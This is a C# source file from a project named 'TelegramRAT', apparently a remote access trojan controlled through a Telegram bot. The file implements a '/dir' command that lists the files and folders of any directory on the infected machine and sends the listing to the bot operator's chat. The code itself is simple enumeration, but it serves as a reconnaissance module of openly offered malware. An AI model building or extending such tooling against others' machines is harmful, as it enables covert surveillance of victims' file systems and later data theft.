using Telegram.Bot;
using System.Text;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class DirCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "dir";
    public override string Description => "Get all files and folders from specified directory. If no path is provided, shows current directory.";
    public override string Example => "/dir C:\\Program Files";
    public override int ArgsCount => -1;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var pathInput = model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty);
            var targetDirectoryInput = fileSystemService.SanitizePath(pathInput);
            
            string curdir = !string.IsNullOrWhiteSpace(targetDirectoryInput)
                ? targetDirectoryInput
                : fileSystemService.GetCurrentDirectory();

            if (!fileSystemService.DirectoryExists(curdir))
            {
                await notificationService.SendErrorAsync(model.Message, new DirectoryNotFoundException($"The directory \"{targetDirectoryInput}\" does not exist."));
                return;
            }

            var files = fileSystemService.EnumerateFiles(curdir);
            var dirs = fileSystemService.EnumerateDirectories(curdir);

            var response = new StringBuilder();

            bool hasFiles = false;
            foreach (var file in files)
            {
                if (!hasFiles)
                {
                    response.AppendLine("<b>Files:</b>\n");
                    hasFiles = true;
                }
                response.AppendLine($"<code>{fileSystemService.GetFileName(file)}</code>");
                if (response.Length > 4000)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
                    response.Clear();
                }
            }
            if (hasFiles) response.AppendLine();

            bool hasDirs = false;
            foreach (var dir in dirs)
            {
                if (!hasDirs)
                {
                    response.AppendLine("<b>Folders:</b>\n");
                    hasDirs = true;
                }
                response.AppendLine($"<code>{fileSystemService.GetFileName(dir)}</code>");
                if (response.Length > 4000)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
                    response.Clear();
                }
            }

            if (response.Length > 0 || hasFiles || hasDirs)
            {
                if (response.Length > 0)
                    await botClient.SendMessage(model.Message.Chat.Id, response.ToString(), parseMode: ParseMode.Html);
            }
            else
            {
                await notificationService.SendInfoAsync(model.Message, "This directory contains no files and no folders.");
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
